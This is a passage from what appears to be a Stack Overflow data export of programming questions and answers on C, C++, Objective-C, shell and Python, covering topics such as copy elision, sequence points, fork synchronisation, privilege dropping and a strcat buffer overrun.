<li>ctor</li>
<li>copy ctor</li>
<li>move ctor</li>
<li>dtor</li>
<li>dtor</li>
<li>dtor</li>
</ol>

<p>and it IS true, but <strong>only if compiler optimization is turned off</strong>. When optimization is turned ON then the output is entirely different. With optimization turned on, the output is:</p>

<ol>
<li>ctor</li>
<li>copy ctor</li>
<li>dtor</li>
<li>dtor</li>
</ol>

<p>With compiler optimization, the test variable is the return variable.</p>

<p>My question is, what conditions would cause this to not be optimized this way?</p>

<p>I have always been taught that returning a struct/class which results in extra copy constructors could better be optimized by being passed in as a reference but the compiler is doing that for me. So is return a structure still considered bad form?</p>
","9530","","<p>Both outputs are permissible.  The C++03 language standard says, in clause 12.8/15:</p>

<blockquote>
  <p>When certain criteria are met, an implementation is allowed to omit the copy construction of a class object,
  even if the copy constructor and/or destructor for the object have side effects. In such cases, the implementation
  treats the source and target of the omitted copy operation as simply two different ways of referring to
  the same object, and the destruction of that object occurs at the later of the times when the two objects
  would have been destroyed without the optimization.<sup>111)</sup> This elision of copy operations is permitted in the
  following circumstances (which may be combined to eliminate multiple copies):</p>
  
  <ul>
  <li>in a <code>return</code> statement in a function with a class return type, when the expression is the name of a
  non-volatile automatic object with the same cv-unqualified type as the function return type, the copy
  operation can be omitted by constructing the automatic object directly into the function’s return value</li>
  <li>when a temporary class object that has not been bound to a reference (12.2) would be copied to a class
  object with the same cv-unqualified type, the copy operation can be omitted by constructing the temporary
  object directly into the target of the omitted copy</li>
  </ul>
</blockquote>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/621542/compilers-and-argument-order-of-evaluation-in-c"">Compilers and argument order of evaluation in C++</a>  </p>
</blockquote>



<p>i have a print statement like below...</p>

<pre><code>  int i=0;
  printf(""%d,%d,%d,%d,%d,%d"",i++,i,++i,i--,++i,i);
</code></pre>

<p>according to precedence <code>i++,i,++i,i--,++i,i</code>  should be evaluated like below step by step...</p>

<pre><code>0,i,++i,i--,++i,i   // after this i=1;

0,i,++i,1,++i,i    //  after this i=0;

0,i,++i,1,1,i      //  after this i=1;

0,i,2,1,1,i       //   after this i=2;

0,2,2,1,1,2       //   after this i=2;  
</code></pre>

<p>and final result as i think from this logic  should be...</p>

<pre><code> 0,2,2,1,1,2 
</code></pre>

<p>but i am getting <code>2,2,2,1,2,2</code>  what is the reason behind this? </p>

<p>btw i m using visual c++ 2010...</p>
","9530","","<p>That's <strong>undefined behavior</strong>.  The order of evaluation of the arguments to a function is specifically left <em>unspecified</em> by the C and C++ language standards in order to let the compiler produce the most optimal machine code across a broad range of hardware.</p>

<p>You're not allowed to modify a variable more than once between <em>sequence points</em>.  The language standard says that sequence points only come at particular points in your code, such as at the semicolons that delimit statements.  There is a sequence point after the initial assignment <code>int i=0;</code>, there is a sequence point after <code>printf</code> returns, and there is a sequence point after all of the arguments to <code>printf</code> have been evaluated but before <code>printf</code> actually gets called, but there is <em>not</em> a sequence point in between the evaluation of each of the arguments.</p>
"
"<p>Pretty much as the title says. I have a snippet of code that looks like this:</p>

<pre><code>pid_t = p;

p = fork();

if (p == 0) {
    childfn();
} else if (p &gt; 0) {
    parentfn();
} else {
    // error
}
</code></pre>

<p>I want to ensure that either the parent or the child executes (but not returns from) their respective functions before the other.</p>

<p>Something like a call to sleep() would probably work, but is not guaranteed by any standard, and would just be exploiting an implementation detail of the OS's scheduler...is this possible? Would vfork work?</p>

<p>edit: Both of the functions find their way down to a system() call, one of which will not return until the other is started. So to re-iterate: I need to ensure that either the parent or the child only calls their respective functions (but not returns, cause they won't, which is what all of the mutex based solutions below offer) before the other. Any ideas? Sorry for the lack of clarity.</p>

<p>edit2: Having one process call sched_yield and sleep, I seem to be getting pretty reliable results. vfork does provide the semantics I am looking for, but comes with too many restrictions on what I can do in the child process (I can pretty much only call exec). So, I have found some work-arounds that are good enough, but no real solution. vfork is probably the closest thing to what I was looking for, but all the solutions presented below would work more or less.</p>
","9530","","<p>This problem would normally be solved by a <a href=""http://en.wikipedia.org/wiki/Mutex"" rel=""nofollow"">mutex</a> or a <a href=""http://en.wikipedia.org/wiki/Semaphore_%28programming%29"" rel=""nofollow"">semaphore</a>.  For example:</p>

<pre><code>// Get a page of shared memory
int pagesize = getpagesize();
void *mem = mmap(NULL, pagesize, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
if(!mem)
{
  perror(""mmap"");
  return 1;
}

// Put the semaphore at the start of the shared page.  The rest of the page
// is unused.
sem_t *sem = mem;
sem_init(sem, 1, 1);

pid_t p = fork();

if (p == 0) {
    sem_wait(sem);
    childfn();
    sem_post(sem);
} else if (p &gt; 0) {
    sem_wait(sem);
    parentfn();
    sem_post(sem);

    int status;
    wait(&amp;status);
    sem_destroy(sem);
} else {
    // error
}

// Clean up
munmap(mem, pagesize);
</code></pre>

<p>You could also use a mutex in a shared memory region, but you need to make sure to create with non-default attributes with the process-shared attribute said to shared (via <a href=""http://pubs.opengroup.org/onlinepubs/009695399/functions/pthread_mutexattr_getpshared.html"" rel=""nofollow""><code>pthread_mutexattr_setpshared(&amp;mutex, PTHREAD_PROCESS_SHARED)</code></a>) in order for it to work.</p>

<p>This ensures that only one of <code>childfn</code> or <code>parentfn</code> will execute at any given time, but they could run in either order.  If you need to have a particular one run first, start the semaphore off with a count of 1 instead of 0, and have the function that needs to run first not wait for the semaphore (but still post to it when finished).  You might also be able to use a <a href=""http://en.wikipedia.org/wiki/Condition_variable"" rel=""nofollow"">condition variable</a>, which has different semantics.</p>
"
"<p>I have a class <code>A</code> with a property <code>NSString *name</code>. If have an <code>NSArray</code> and add many <code>A</code> objects into this array, is casting necessary each time I retrieve an object? i.e.</p>

<pre><code>NSString* n = (NSString*)[arr objectAtIndex:1];
</code></pre>

<p>Or is there a another way to do it kind of like in java where you have <code>ArrayList&lt;A&gt; arr</code>?</p>
","9530","","<p><code>NSArray</code> do not store information about the types of objects contained in them.  If you know for sure the types of objects in your array, you can perform a cast, either implicitly or explicitly:</p>

<pre><code>NSString *n = [arr objectAtIndex:1];  // implicit cast from id to NSString*
NSString *n = (NSString *)[arr objectAtIndex:1];  // explicit cast
</code></pre>

<p>There's no difference in runtime cost between implicit and explicit casts, it's just a matter of style.  If you get the type wrong, then what is very likely going to happen is that you'll get the dreaded <code>unrecognized selector sent to instance 0x12345678</code> exception.</p>

<p>If you have a heterogeneous array of different types of objects, you need to use the <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Protocols/NSObject_Protocol/Reference/NSObject.html#//apple_ref/occ/intfm/NSObject/isKindOfClass%3a""><code>isKindOfClass:</code></a> method to test the class of the object:</p>

<pre><code>id obj = [arr objectAtIndex:1];
if ([obj isKindOfClass:[NSString class])
{
    // It's an NSString, do something with it...
    NSString *str = obj;
    ...
}
</code></pre>
"
"<p>I've this PHP code and want the equivalent in C for performance reasons. 
I've done R&amp;D Google; I didn't get any solution.</p>

<p>The code is:</p>

<pre><code>&lt;?php
   $array = array('tom','jerry','cat'); //variable 
   $tmpl  = 'test %s for %s with %s'; //args taken from $array
   print vsprintf($tmpl,$array).""\n"";
?&gt;
</code></pre>
","9530","","<p>If you know how many arguments you're passing, you just call <a href=""http://linux.die.net/man/3/snprintf"" rel=""nofollow""><code>snprintf(3)</code></a>.  If you don't know, the only other option is to use a variadic function and call <a href=""http://linux.die.net/man/3/vsnprintf"" rel=""nofollow""><code>vsnprintf</code></a>.  This is commonly used in logging code as a thin wrapper around <code>snprintf</code>.  For example:</p>

<pre><code>void my_log_function(int level, const char *format, ...)
{
    if(level &gt;= MIN_LOGGING_LEVEL)
    {
        va_list ap;
        va_start(ap, format);

        char buffer[4096];
        vsnprintf(buffer, sizeof(buffer), format, ap);
        // Now write buffer to a file/stdout/the debugger/etc.

        va_end(ap);
    }
}
...
my_log_function(LOG_LEVEL_DEBUG, ""foo %d bar %s baz"", 42, ""quux"");
</code></pre>

<p>If you <em>really</em> only have the arguments in an array, there's no way to do what you want using standard C.  You can use libraries such as <a href=""http://www.haible.de/bruno/packages-ffcall-README.html"" rel=""nofollow"">ffcall</a>, but it's not portable to all systems.  For example, here's how you could do it with ffcall:</p>

<pre><code>int array_vsnprintf(char *str, size_t size, const char *format, int *args,
                    int numargs)
{
    av_alist alist;  // will hold the argument list
    int retval;  // will hold the return value from vsnprintf
    av_start_int(alist, &amp;vsnprintf, &amp;retval);

    // Add the arguments to the argument list.  This assumes all of the
    // arguments are ints -- if you have heterogeneous types, you need to keep
    // track of the type information somewhere and use the appropriate macro
    // for each argument.
    av_ptr(str);
    av_int(size);
    av_ptr(format);

    int i;
    for(i = 0; i &lt; numargs; i++)
        av_int(alist, args[i]);

    // Now call vsnprintf
    av_call(alist);

    return retval;
}
</code></pre>
"
"<p>here is the C++ sample</p>

<pre><code>int a[1000] = {3,1,5,4}
int b[1000] = {7,9,11,3}
</code></pre>

<p>how do i make it so if i sort array a, array b also following array a</p>

<p>example</p>

<pre><code>a[1000] = {1,3,4,5}
b[1000] = {9,7,3,11}
</code></pre>

<p>is it possible using sort function</p>

<pre><code>sort(a,a+4)
</code></pre>

<p>but also sort array b aswell ?</p>

<p>edit: what if there are 3 arrays ?</p>
","9530","","<p>The simplest way is to rearrange your data into an array-of-structs instead of a pair of arrays so that each datum is contiguous; then, you can use an appropriate comparator.  For example:</p>

<pre><code>struct CompareFirst
{
    bool operator() (const std::pair&lt;int,int&gt;&amp; lhs, const std::pair&lt;int,int&gt;&amp; rhs)
    {
        return lhs.first &lt; rhs.first;
    }
};

// c[i].first contains a[i], c[i].second contains b[i] for all i
std::pair&lt;int, int&gt; c[1000];
std::sort(c, c+1000, CompareFirst());
</code></pre>

<p>If you can't refactor your data like that, then you need to define a custom class that acts as a <a href=""http://www.sgi.com/tech/stl/RandomAccessIterator.html"" rel=""nofollow"">RandomAccessIterator</a>:</p>

<pre><code>struct ParallalArraySortHelper
{
    ParallelArraySortHelper(int *first, int *second)
        : a(first), b(second)
    {
    }

    int&amp; operator[] (int index) { return a[index]; }
    int operator[] const (int index) { return a[index]; }

    ParallelArraySortHelper operator += (int distance)
    {
        a += distance;
        b += distance;
        return *this;
    }
    // etc.
    // Rest of the RandomAccessIterator requirements left as an exercise

    int *a;
    int *b;
};
...
int a[1000] = {...};
int b[1000] = {...};
std::sort(ParallalArraySortHelper(a, b), ParallelArraySortHelper(a+1000, b+1000));
</code></pre>
"
"<p>I have a number of points on a 2D graph, and I am concerned with they quadrant they lie in than the actual coordinates itself. I have a function ReflectX() which performs ""Reflecting along X-axis"" on a subset and returns the updated quadrant in which the points now lie.
So, points originally in quadrant 1 will now lie in 4 and vice-versa; similarly for quadrant 2 and 3.
Instead of using 4 if-else statements, I want to use just 2, for optimising. Can that be done? Any suggestions for other kind of optimisation is also welcome. What I have done so far (which isnt much):</p>

<pre><code>int ReflectX(int q[], int x, int y){//x &amp; y provide the range boundaries
    int i;
    for(i=x-1; i&lt;y; i++){
        if(q[i]==1 || q[i]==4) q[i]=(q[i]+3)%6;
        else //change 2 into 3 and 3 into 2
    }
}
</code></pre>

<p>EDIT: I had not posted about ReflectY() because I could do it with one if-else condition. However, based on <a href=""http://stackoverflow.com/users/9530/adam-rosenfield"">Adam Rosenfield</a> 's answer I decided to optimise this function with a one-liner formula and got:</p>

<pre><code>q[i] = (q[i] - pow(-1, q[i]%2));
</code></pre>
","9530","","<p>You can get a much simpler answer by just looking at the table of all possible inputs and outputs:</p>

<pre>
Initial quadrant   Reflected quadrant
1                  4
2                  3
3                  2
4                  1
</pre>

<p>So, just do this:</p>

<pre><code>q[i] = 5 - q[i];
</code></pre>
"
"<p>Pretty new to this kind of development. Wondering if anyone can point me in the right direction. As far as I can see it, using MacPorts has an error where it doesn't work. However, I was reading around and saw this: <a href=""http://beardedcodewarrior.net/2011/07/25/building-gcc-4-6-1-on-mac-os-x-lion/"" rel=""nofollow"">http://beardedcodewarrior.net/2011/07/25/building-gcc-4-6-1-on-mac-os-x-lion/</a> but still couldn't get it to work. When I executed make for gcc, it took over 3 hours to complete and then once I execute sudo make install, it completed successfully but when I try gcc --version, it still says gcc version 4.2.1 (Based on Apple Inc. build 5658) (LLVM build 2335.15.00). I need the 4.6.1 version!</p>
","9530","","<p>There are three likely possibilities:</p>

<ol>
<li>It installed correctly and went into a directory earlier in your <code>$PATH</code> than your previous GCC installation, but Bash's internal hash table entry is still pointing to the old GCC.</li>
<li>It installed correctly but went into a directory later in your <code>$PATH</code> than your previous GCC installation.</li>
<li>In installed correctly, but the executable is not named <code>gcc</code>.</li>
</ol>

<p>If #1, just run the command <code>hash -r</code> and try again.  In order to avoid frequent <code>$PATH</code> lookups, Bash uses a hash table to map executable names into executable locations.  When you install a new executable earlier in your <code>$PATH</code> with the same name as one later in the <code>$PATH</code>, Bash doesn't know about it.  Running <code>hash -r</code> says ""clear out your hash table"".  Alternatively, you can just run <code>hash -d gcc</code> to say ""forget about gcc in your hash table"".</p>

<p>If #2, then you either need to execute gcc by its full name (e.g. <code>/opt/local/bin/gcc</code>), or modify your <code>$PATH</code> so that the directory containing the new gcc is earlier than the directory of your existing gcc.  Assuming you installed MacPorts normally, that should already be done for you—MacPorts puts <code>/opt/local/bin</code> earlier in your <code>$PATH</code> than <code>/usr/bin</code> by modifying your <code>~/.bash_profile</code> startup file.</p>

<p>If #3, then figure out what name the executable was given.  It was almost certainly given a name prefixed with gcc, so if you type gcc and then hit the tab key twice, Bash will give you a list of all of the commands that begin with gcc.  It's quite likely it was given a name likw <code>gcc-4.6</code> or <code>gcc-mp-4.6</code>.</p>
"
"<p>I have a socket opened and I'd like to read some json data from it. The problem is that the <code>json</code> module from standard library can only parse from strings (<code>load</code> only reads the whole file and calls <code>loads</code> inside) It even looks that all the way inside the module it all depends on the parameter being string. </p>

<p>This is a real problem with sockets since you can never read it all to string and you don't know how many bytes to read before you actually parse it.</p>

<p>So my questions are: Is there a (simple and elegant) workaround? Is there another json library that can parse data incrementally? Is it worth writing it myself?</p>

<p>Edit: It is XBMC jsonrpc api. There are no message envelopes, and I have no control over the format. Each message may be on a single line or on several lines.
I could write some simple parser that needs only getc function in some form and feed it using <code>s.recv(1)</code>, but this doesn't as a very pythonic solution and I'm a little lazy to do that :-)</p>
","9530","","<p>If you're getting the JSON from an HTTP stream, use the <code>Content-Length</code> header to get the length of the JSON data.  For example:</p>

<pre><code>import httplib
import json

h = httplib.HTTPConnection('graph.facebook.com')
h.request('GET', '/19292868552')
response = h.getresponse()
content_length = int(response.getheader('Content-Length','0'))

# Read data until we've read Content-Length bytes or the socket is closed
data = ''
while len(data) &lt; content_length or content_length == 0:
    s = response.read(content_length - len(data))
    if not s:
        break
    data += s

# We now have the full data -- decode it
j = json.loads(data)
print j
</code></pre>
"
"<p>EDIT:</p>

<p>I am trying to write a simple smoketest, where all options and reasonable parameters are tested.</p>

<p>I used popen() to execute the program that should be tested.
Using this approach does not work, because if the process dies with a signal (SIGINT, SIGSEGV...) the pipe from popen() does not tell me what happend.</p>

<p>Writing a signal handler did not help since popen creates a new process that receives the signals but not my smoketest.</p>

<p>Thanks to the answers i used pipe(), fork() and execv() to create my own popen()-version.</p>

<p>When the program now segfaults there is the problem that the pipe is useless (a read caused weird behavior -> blocked the process until i send a sigkill to the parent!)</p>

<p>To avoid this i tried different things and my solution is the following (it is simple but it took me a while to figure it out). so here is my example-code:</p>

<pre><code>static int child_dead = 0;

void sigaction_sigchld(int signal) { /* Child died */
    child_dead = 1;
}

int main(int argc, char *argv[], char *env[])
{
    char *crashing_program = ""/program_path/and_name"";
    int ret;
    int byte;

    pid = fork();

    if(pid == 0) /* Child */
    {
        execve(crashing_program, argv, env);

        /* if execve returns that it mus have failed! */
        fprintf(stderr, ""Exec failed\n"");
        _exit(-1);
    } else /* Parent */
    {
        if(!child_dead)
        {
            byte = read(pipe_out[1], line, BUFFSIZE);
            if(!byte){
                perror(""Smoketest:Line:xxx"");
            } else
            {
                fprintf(stdout, line);
            }
        }
        wait(&amp;child_status);
        /*
          check if the child died with SIGSEGV etc
        */
    }
</code></pre>

<p>This seems to work fine as long as i only have one child at a time which is sufficient for me though. I anyone has a better idea or any tipps for me i would be glad to update this entry.</p>

<p>Last but not least: Of course using this method it is probably impossible to do any cleanup.</p>

<p>Cheers.</p>
","9530","","<p>See the documentation for <a href=""http://linux.die.net/man/2/waitpid"" rel=""nofollow""><code>waitpid(2)</code></a>.  There are a bunch of macros you can use to test how the child process was terminated.  In particular, you can use <code>WIFSIGNALLED()</code> and <code>WTERMSIG()</code> to test if the child process was terminated by a signal, and if so, which signal:</p>

<pre><code>int status = pclose(...);
if (WIFSIGNALLED(status))
{
    // It was terminated by a signal
    if (WTERMSIG(status) == SIGSEGV)
    {
        // It was terminated by a segfault
    }
}
</code></pre>
"
"<p>I'm new to linux and starting from the basics.</p>

<p>--
I thought alias is used to make a shortcut to a command.
But I tried the following using a variable (in Ubuntu) and still works!</p>

<pre><code>$ foo=""mkdir Directory""
$ $foo #this will create a directory named Directory
</code></pre>

<p>using alias:</p>

<pre><code>$ alias bar=""mkdir Directory""
$ bar #creates a Directory named directory
</code></pre>

<p>Is that how it is supposed to work?
Many thanks for the answers :)</p>
","9530","","<p>Variables are much more versatile than aliases.  Variables can be used anywhere in a command line (e.g. as parts of program arguments), whereas aliases can <em>only</em> be used as the names of programs to run, i.e. as the first word in a command line.  For example:</p>

<pre><code>foo=""mkdir Directory""
echo $foo  # Prints ""mkdir Directory""

alias bar=""mkdir Directory""
echo bar  # Nothing gets expanded -- just ""bar"" is printed
</code></pre>

<p>Variables can also be exported into the environment of child processes.  If you use the <a href=""http://www.gnu.org/s/bash/manual/bash.html#Bourne-Shell-Builtins""><code>export</code> builtin</a> to export variables, then programs can use <a href=""http://linux.die.net/man/3/getenv""><code>getenv(3)</code></a> function to get the variables' values.</p>

<p>See the <a href=""http://www.gnu.org/s/bash/manual/bash.html#Shell-Expansions"">Bash manual</a> for a full description of all of the different types of expansions it can perform and how it performs them.  See also the section on <a href=""http://www.gnu.org/s/bash/manual/bash.html#Aliases"">aliases</a>.</p>
"
"<p>I can't seem to think of a reliable way (that also compacts memory) to remove the first N elements from a std::vector. How would one go about doing that?</p>
","9530","","<p>Use the <code>.erase()</code> method:</p>

<pre><code>// Remove the first N elements, and shift everything else down by N indices
myvec.erase(myvec.begin(), myvec.begin() + N);
</code></pre>

<p>This will require copying all of the elements from indices N+1 through the end.  If you have a large vector and will be doing this frequently, then use a <code>std::deque</code> instead, which has a more efficient implementation of removing elements from the front.</p>
"
"<p>I was looking over the <a href=""http://arduino.cc/en/Reference/StyleGuide"" rel=""nofollow"">StyleGuide</a> for the Arduino when I noticed that in the <code>Commenting your Code</code> section, it recommends to avoid using pointers and #defines.</p>

<p>Is there a reason the writer stated this? There isn't an explanation as to why he/she stated this. It doesn't make sense to me. Is this something specific to embedded systems?</p>
","9530","","<p>That advice is garbage -- pointers are an extremely useful and powerful tool, and quite often they're required in order to do something effectively.</p>

<p><code>#define</code>s, on the other hand, should often be avoided for a number of reasons (<a href=""http://www.parashift.com/c++-faq-lite/inline-functions.html#faq-9.5"" rel=""nofollow"">one</a> <a href=""http://www.parashift.com/c++-faq-lite/misc-technical-issues.html#faq-39.4"" rel=""nofollow"">two</a> <a href=""http://www.parashift.com/c++-faq-lite/misc-technical-issues.html#faq-39.5"" rel=""nofollow"">three</a> <a href=""http://www.parashift.com/c++-faq-lite/misc-technical-issues.html#faq-39.6"" rel=""nofollow"">four</a>) in favor of inline functions, but again there are many situations where macros should be used and are the best solution.  It depends on your problem -- be smart, and know when to use them and when not to.  Don't blindly avoid using them because some FAQ told you not to.</p>
"
"<p>I have to open a system file and read from it. This file is usually only readable by root (the super user). I have a way to ask the user for the superuser password. I would like to use this credentials to open the file and read from it without having my entire program running as a superuser process. Is there a way to achieve this in a multiplatform way?</p>
","9530","","<p>Since privileges work completely differently on Unix-like systems and Windows, you're going to need to have platform-specific code.  In any case, you'll need to break up your program into two separate programs, one of which runs with elevated permissions and the other of which runs with standard/reduced permissions.</p>

<p>In Unix-like systems (including Linux and Mac OS X), the executable that runs with elevated permissions should do this:</p>

<ol>
<li>Assume you're running as root and open the file for reading.  Since you mentioned that the file is very large, you don't actually read the whole file in, you just keep an open file descriptor.  If opening it fails, print an error message and exit.</li>
<li>Use <a href=""http://linux.die.net/man/2/setreuid"" rel=""nofollow""><code>setreuid(2)</code></a> and <a href=""http://linux.die.net/man/2/setreuid"" rel=""nofollow""><code>setregid(2)</code></a> to set your user ID and group ID back to an unprivileged user.</li>
<li>Use one of the <a href=""http://linux.die.net/man/3/exec"" rel=""nofollow""><code>exec(3)</code></a> functions to execute the unprivileged executable.</li>
<li>If you want to make it so that you can run this program without using <code>sudo</code>, then make it owned by root and make it a set-user-ID executable with <code>chown root the-program; chmod +s the-program</code>.</li>
</ol>

<p>The unprivileged program will now be run with normal permissions, but when it starts up, it will have an open file descriptor (file descriptor #3) that can be used to read from your special file.</p>

<p>For Windows, it's similar but slightly different:</p>

<ol>
<li>Assume you're running as root and open the file for reading using <a href=""http://msdn.microsoft.com/en-us/library/aa363858%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateFile</code></a>.  Do not use default security attributes -- create a <code>SECURITY_ATTRIBUTES</code> structure with <code>bInheritHandle</code> set to <code>TRUE</code> so that the handle will be inherited by child processes.  If opening the file failed, print an error message and exit.</li>
<li>Use <a href=""http://msdn.microsoft.com/en-us/library/ms682425%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateProcess</code></a> to launch your child process.  Pass in the handle above on the command line (e.g. printed as a numerical value); you could also <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2003/12/11/56043.aspx"" rel=""nofollow"">use a shared memory region</a>, but that's more trouble than it's worth for this problem.</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/bb756929.aspx"" rel=""nofollow"">Embed a manifest</a> in this executable with <code>requireAdministrator</code> set to <code>true</code>.  After you do this, when you run the program, you'll get a UAC prompt asking you if you want to allow the program to makes changes.</li>
</ol>

<p>The child process then does grabs the inherited handle by parsing the command line, and it can then read in the data as it pleases.</p>

<p>One problem with this approach is that when you inherit a handle, you have to use the low-level system calls (<code>read(2)</code> on Unix, <code>ReadFile</code> on Windows) to read from it -- you can't use higher-level functions like C's <code>fread(3)</code> or C++'s <code>iostream</code>s (ok, Unix has <code>fdopen(3)</code>, but there's no equivalent on Windows as far as I'm aware).</p>

<p>As I'm sure you've noticed by now, everything above has been in C.  In Unix, this translates pretty straightforwardly into Python, since the <a href=""http://docs.python.org/library/os.html"" rel=""nofollow""><code>os</code> module</a> has lots of goodies like <code>setreuid</code>, <code>exec*</code>, and <code>fdopen</code>.  On Windows, you might be able to do some of this stuff with the <code>ctypes</code> module and/or <a href=""http://sourceforge.net/projects/pywin32/"" rel=""nofollow"">Pywin32</a>, but it's probably easier to stick with C.</p>
"
"<p>I am writing a C extension for PHP and there I have to build up a string based on some substrings. Currently it looks like this:</p>

<pre><code>spprintf(
    &amp;bucket_list_url, 
    strlen(host) + 1 + sizeof(port) + 1 + strlen(prefix) +strlen(""?buckets=true""),
    ""%s:%d/%s?buckets=true"",
    host, 
    port,
    prefix
);
</code></pre>

<p>It works, but looks horrible and is possibly difficult to maintain. Is there a more cleaner way for safely concatenating these strings together?</p>

<p>I am a beginner in C, as you've probably noticed, so I couldn't come up with any cleaner solution so far.</p>
","9530","","<p>If you're using the GNU C runtime (glibc), you can use the <a href=""http://linux.die.net/man/3/asprintf"" rel=""nofollow""><code>asprintf(3)</code></a> function to format a string to a dynamically allocated buffer.  That way, you don't have to worry about having a large enough buffer.  For example:</p>

<pre><code>// Error checking omitted for expository purposes
char *bucket_list_url;
asprintf(&amp;bucket_list_url, ""%s:%d/%s?buckets=true"", host, port, prefix);
...  // do stuff
free(bucket_list_url);
</code></pre>

<p>If you're not using glibc, you can still use <a href=""http://linux.die.net/man/3/snprintf"" rel=""nofollow""><code>snprintf(3)</code></a>, but you have to guess at the buffer length.  If you guess wrong, you have to allocate a bigger buffer and try again.</p>
"
"<p>I'm new to C++, I have experience with C#, Objective-C and JavaScript.</p>

<p>At the moment I'm trying to write a function that takes a path and returns a directory listing (all files and folders at that path). I'm doing this on Ubuntu.</p>

<p>Here's my code so far, to be honest I'm struggling to understand the double pointer syntax and what it's achieving but this is where my googling has lead me...</p>

<pre><code>int FileManager::GetDirectoryListing(char *path, dirent **directoryEntries)
{
    // Debug output...
    printf(""Listing directory at %s\n"", path);

    // Allocate memory for the directory entries
    *directoryEntries = new dirent[MAX_FILES];

    // Open the path we were provided
    DIR *directory = opendir(path);

    // A counter of how many entries we have read
    int entryCount = 0;

    // Make sure we were able to open the directory
    if(directory) {

        printf(""Successfully opened directory\n"");

        // Read the first entry in the directory
        struct dirent *directoryEntry = readdir(directory);

        // While we have a directory entry
        while(directoryEntry) {

            // Debug output...
            printf(""%s\n"", directoryEntry-&gt;d_name);

            // Copy the directory entry to the array of directory entries we will return
            memcpy(&amp;directoryEntries[entryCount], directoryEntry, sizeof(struct dirent));

            // Increase our counter
            ++entryCount;

            // Read the next directory
            directoryEntry = readdir(directory);
        }

        // Close the directory
        closedir(directory);
    }

    return entryCount;
}
</code></pre>

<p>And then I call this function by:</p>

<pre><code>    dirent *directoryEntries = NULL;

    int numberOfEntries = FileManager::GetDirectoryListing(deviceRootPath, &amp;directoryEntries);

    printf(""File Manager returned directory listing.\n"");

    for(int i = 0; i &lt; numberOfEntries; ++i) {

        printf(""Looping through directory entries, at index: %i\n"", i);

        printf(""%s\n"", directoryEntries[i].d_name);
    }
</code></pre>

<p>It's locking up when it tries to access the first element in <code>directoryEntries</code> i.e. The first time around the loop.</p>

<p>I know I'm not understanding what the double pointer is doing and I don't have a clear picture in my head about the structure of <code>directoryEntries</code> after the call to <code>GetDirectoryListing</code>.</p>

<p>What is happening and what is the correct way to loop through <code>directoryEntries</code>?</p>
","9530","","<p>This line</p>

<pre><code>memcpy(&amp;directoryEntries[entryCount], directoryEntry, sizeof(struct dirent));
</code></pre>

<p>should instead be this:</p>

<pre><code>memcpy(&amp;(*directoryEntries)[entryCount], directoryEntry, sizeof(struct dirent));
</code></pre>

<p>or equivalently:</p>

<pre><code>memcpy(*directoryEntries + entryCount, directoryEntry, sizeof(struct dirent));
</code></pre>

<p>The reason is that <code>directoryEntries</code> is a pointer <em>to a pointer</em> to an array.  In memory, it looks like this:</p>

<pre><code>                                    +------------+
directoryEntries --&gt; array_head --&gt; | dirents[0] |
                                    +------------+
                                    | dirents[1] |
                                    +------------+
                                    | dirents[2] |
                                    +------------+
                                    |    ...     |
</code></pre>

<p>But you're treating it like <code>directoryEntries</code> is a pointer to an array, which it is not:</p>

<pre><code>WRONG!               +------------+
directoryEntries --&gt; | dirents[0] |
                     +------------+
                     | dirents[1] |
                     +------------+
                     |    ...     |
</code></pre>

<p>So you're writing out-of-bounds into memory you don't own, resulting in Undefined Behavior.</p>

<p>The reason you need an extra level of indirection is because in C, function parameters are always passed by value.  In order to modify a parameter, you need to pass in a pointer to the original value, which is what you're doing.  You just have to remember that when dealing with that pointer, you have an extra level of indirection.</p>

<p>If you're using C++ and not C, you would be much better off using a reference parameter instead of a pointer, and you should also use a <code>std::vector&lt;struct dirent&gt;</code>.  You don't have the extra level of indirection to worry about, and the memory management is handled for you automatically.</p>
"
"<p>I am trying to write a short program that acts like a client, like telnet.
I receive from the user input like so:  www.google.com 80 (the port number) and /index.html
However, I get some errors.  When I write some debug information, it says that I have a bad file descriptor and Read Failed on file descriptor 100 messagesize = 0. </p>

<pre><code>struct hostent * pHostInfo;
struct sockaddr_in Address;
long nHostAddress;
char pBuffer[BUFFER_SIZE];
unsigned nReadAmount;
int nHostPort = atoi(port);

vector&lt;char *&gt; headerLines;
char buffer[MAX_MSG_SZ];
char contentType[MAX_MSG_SZ];

int hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

if (hSocket == SOCKET_ERROR)
{
  cout &lt;&lt; ""\nCould Not Make a Socket!\n"" &lt;&lt; endl;
  return 1;
}
pHostInfo = gethostbyname(strHostName);
memcpy(&amp;nHostAddress,pHostInfo -&gt; h_addr, pHostInfo -&gt; h_length);

Address.sin_addr.s_addr = nHostAddress;
Address.sin_port=htons(nHostPort);
Address.sin_family = AF_INET;

if (connect(hSocket, (struct sockaddr *)&amp;Address, sizeof(Address)) == SOCKET_ERROR)
{
  cout &lt;&lt; ""Could not connect to the host!"" &lt;&lt; endl;
  exit(1);
}
char get[] = ""GET "";
char http[] = "" HTTP/1.0\r\nHost: "";
char end[] = ""\r\n\r\n"";
strcat(get, URI);
strcat(get, http);
strcat(get, strHostName);
strcat(get, end);
strcpy(pBuffer, get);
int len = strlen(pBuffer);
send(hSocket, pBuffer, len, 0);
nReadAmount = recv(hSocket,pBuffer, BUFFER_SIZE, 0);
//Parsing of data here, then close socket
if (close(hSocket) == SOCKET_ERROR)
{
  cout &lt;&lt; ""Could not close the socket!"" &lt;&lt; endl;
  exit(1);
} 
</code></pre>

<p>Thanks!   </p>
","9530","","<p>You have a <a href=""http://en.wikipedia.org/wiki/Buffer_overrun"">buffer overrun</a> in your code.  You're attempting to allocate a bunch of character arrays together into a buffer than is only 5 bytes long:</p>

<pre><code>char get[] = ""GET "";  // 'get' is 5 bytes long
char http[] = "" HTTP/1.0\r\nHost: "";
char end[] = ""\r\n\r\n"";
strcat(get, URI);  // BOOM!
strcat(get, http);
strcat(get, strHostName);
strcat(get, end);
</code></pre>

<p>This is likely overwriting your local variable <code>hSocket</code>, resulting in the ""bad file descriptor error"".</p>

<p>Since you're using C++ (you have a <code>vector</code> in your code), just use a <code>std::string</code> instead of C arrays of characters so that you don't have to worry about memory management.</p>
